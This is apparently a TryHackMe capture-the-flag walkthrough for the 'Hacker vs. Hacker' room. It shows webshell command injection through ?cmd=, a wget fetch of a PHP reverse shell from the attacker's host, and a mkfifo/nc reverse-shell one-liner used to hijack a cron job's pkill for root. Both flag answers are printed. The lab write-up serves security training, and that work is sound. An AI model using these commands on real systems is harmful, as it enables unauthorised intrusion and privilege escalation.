# [Hacker vs. Hacker](https://tryhackme.com/room/hackervshacker)

> Someone has compromised this server already! Can you get in and evade their countermeasures?

## Scanning

scan the target

```
nmap -sS -sV -Pn 10.10.138.41
```

![image](https://user-images.githubusercontent.com/90561566/211735500-a55fefa6-996f-42aa-a440-8a49f3f5311d.png)

## HTTP

view the webpage

![image](https://user-images.githubusercontent.com/90561566/211735689-9853ed7f-2660-480b-81bf-f2fe1698dec6.png)

it's a recuit page and has a form to submit cv

hmm, there are some notes left about security risk

![image](https://user-images.githubusercontent.com/90561566/211736077-30a9fcbd-29ce-4905-96f8-d83c0c2847cc.png)

## Enumeration

scan directories with gobuster

```
gobuster dir -u http://10.10.138.41/ -w /usr/share/wordlists/dirb/common.txt -t 30
```

![image](https://user-images.githubusercontent.com/90561566/211736616-486fcb70-b07e-4f22-8ce2-650b4cabf47d.png)

the `/cvs` folder seem interesting

![image](https://user-images.githubusercontent.com/90561566/211736800-d763be13-bfd2-4694-a098-05d787584af9.png)

Okay so let’s try to find the hackers shell in folder. Maybe we find a webshell.

![image](https://user-images.githubusercontent.com/90561566/211737049-1a7f8085-5fd0-486d-9889-e086406cc40b.png)

i found a hint left in source code

![image](https://user-images.githubusercontent.com/90561566/211737165-99d06e78-2c5c-4187-9ac0-4423097fc5d9.png)

## Exploitation

So the shell name has to contain `.pdf` and is likely to end with `.php`, i guess it

you can use gobuster to scan for the same result

![image](https://user-images.githubusercontent.com/90561566/211738802-a54fa273-ed96-46b8-acf6-79f903bfb111.png)

Looks like we found it. Now we just have to find the parameter for command injection

Usually this is something like `?cmd=` or `?shell=` or `?command=`

![image](https://user-images.githubusercontent.com/90561566/211739018-66172636-9dce-4ce0-9e5a-1e3a2d06caa0.png)

```
http://10.10.138.41/cvs/shell.pdf.php?cmd=cat%20/etc/passwd
```

![image](https://user-images.githubusercontent.com/90561566/211739813-1e25db28-b636-495c-8426-81306f0e8dda.png)

we see a user lachlan

```
http://10.10.138.41/cvs/shell.pdf.php?cmd=ls%20/home/lachlan
```

![image](https://user-images.githubusercontent.com/90561566/211740195-db787a45-9ad1-4350-99d9-7fc89e0e7d9e.png)

```
http://10.10.138.41/cvs/shell.pdf.php?cmd=cat%20/home/lachlan/user.txt
```

![image](https://user-images.githubusercontent.com/90561566/211740277-aaaa28d3-c852-4da0-b682-081bf5d9dc5e.png)

| Flag | user.txt |
| --- | --- |
| Answer | thm{af7e46b68081d4025c5ce10851430617} |

## Privilege Escalation

prepare you revershell

```
cp /usr/share/webshells/php/php-reverse-shell.php reverse.php
vi reverse.php
python3 -m http.server
```

```
http://10.10.138.41/cvs/shell.pdf.php?cmd=wget%20http://10.8.0.74:8000/reverse.php
```

open your netcat and go to reverse.php

```
nc -vlnp 4444
http://10.10.138.41/cvs/reverse.php
```

![image](https://user-images.githubusercontent.com/90561566/211743022-a9c1de40-5735-4909-88ca-e3a89febbda1.png)

at the same location, we see a interesting folder `/bin` but nothing there

![image](https://user-images.githubusercontent.com/90561566/211743321-1c452b51-c431-4a23-9e37-c225c39f5fb0.png)

maybe i'm in dead-end, but i think about .bash_history

```
cat /home/lachlan/.bash_history
```

![image](https://user-images.githubusercontent.com/90561566/211743796-f1333d96-6f5c-4037-88aa-6af0c6c3590b.png)

it's password of user lachlan

```
ssh lachlan@10.10.211.153
thisistheway123
```

but it kick out us with nope message

![image](https://user-images.githubusercontent.com/90561566/211744519-07e3e17f-3986-44bb-819b-f26d65001f26.png)

check another file we found at bash history

```
cat /etc/cron.d/persistence
```

![image](https://user-images.githubusercontent.com/90561566/211744834-4ade7eb2-44de-46df-95f5-bd2ba34cb62f.png)

after researching, i found a flag at ssh command maybe useful

![image](https://user-images.githubusercontent.com/90561566/211745810-b8638f5d-e5f7-4da2-9300-9c10d357b414.png)

```
ssh lachlan@10.10.211.153 -T
```

![image](https://user-images.githubusercontent.com/90561566/211747040-4de026aa-c502-4944-9c77-d8c6da22cccb.png)

If we look at the persistence again, you will notice that the cronjob looks inside the /home/lachlan/bin

we can create our pkill within the /home/lachlan/bin directory to gain precedence over the default pkill command

![image](https://user-images.githubusercontent.com/90561566/211747600-7b2dab2a-5bd4-44eb-8b80-3eac657344fe.png)

```
echo "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.0.74 4444 >/tmp/f" > /home/lachlan/bin/pkill
chmod +x pkill
```

open netcat listener

```
nc -vlnp 4444
```

![image](https://user-images.githubusercontent.com/90561566/211749014-e43309e0-4f45-4fec-8fb7-21beadae682a.png)

![image](https://user-images.githubusercontent.com/90561566/211749265-e9730114-7633-4089-a5ba-96a23a3d61bc.png)

| Flag | root.txt |
| --- | --- |
| Answer | thm{7b708e5224f666d3562647816ee2a1d4} |
